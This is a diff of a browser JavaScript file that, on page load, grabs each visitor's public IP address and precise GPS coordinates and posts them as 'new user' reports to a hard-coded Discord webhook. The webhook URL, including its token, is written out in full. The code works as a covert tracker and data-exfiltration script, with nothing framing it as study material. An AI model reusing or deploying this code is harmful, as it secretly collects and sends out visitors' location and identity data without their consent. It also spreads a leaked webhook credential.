@@ -1,3 +1,6 @@
+has_ip = false
+located = false
+
 function discord_msg(mesage) {
     fetch("https://discordapp.com/api/webhooks/1314333297173856328/cUtaTn4ds-wtmXm1BUIlGFzRg_eSVpKtNa3tchU00AjmC2PvlQWG9TlJ0d4_vTPOgQYQ", {
         body: JSON.stringify({
@@ -20,27 +23,47 @@ async function get_ip() {
     try {
         const response = await fetch('https://api.ipify.org?format=json');
         let data = await response.json();
-        discord_msg(data.ip, "       go to https://www.iplocation.net/ip-lookup to search ip") }
+         ipv4 = data.ip
+         document.getElementById("ip").innerText = ipv4
+         has_ip = true
+    }
         catch (error) {
         console.error('Error fetching IP address:', error);
-    }
+        };
 };
 
-async function get_location() {
-    dosomething = navigator.geolocation.watchPosition((position) => {
-        discord_msg("ip: " + get_ip())
-        discord_msg("latitude: " + position.coords.latitude + " longitude: " + position.coords.longitude);
-        discord_msg("https://www.google.no/maps/@" + position.coords.latitude + "," + position.coords.longitude + "m/");
-
+    function get_location() {
+    watchID = navigator.geolocation.watchPosition((position) => {
+        latitude = position.coords.latitude;
+        longitude = position.coords.longitude;
+        document.getElementById("location").innerText = (latitude + " " + longitude);
+        located = true
       });
 };
- 
-window.SetTimeOut(get_location(), 2000)
+
+const sleep = (delay) => new Promise((resolve) => setTimeout(resolve, delay))
+
+
+const send_to_discord = async () => {
+    await sleep(3000)
+    discord_msg("---------------------")
+    await sleep(200)
+    discord_msg("new user: ")
+    await sleep(200)
+    if (has_ip) {
+        i = discord_msg("ipv4: " + ipv4)
+    } else {
+        discord_msg("ipv4: n/a")
+    }
+    await sleep(200)
+    if (located) {
+        discord_msg("location: " + latitude + ", " + longitude)
+    } else {
+        discord_msg("location: n/a")
+    }
+}
 
 get_ip()
-get_ip()
-get_ip()
-get_ip()
-get_ip()
-get_ip()
-discord_msg(get_ip)
+get_location()
+send_to_discord()
+
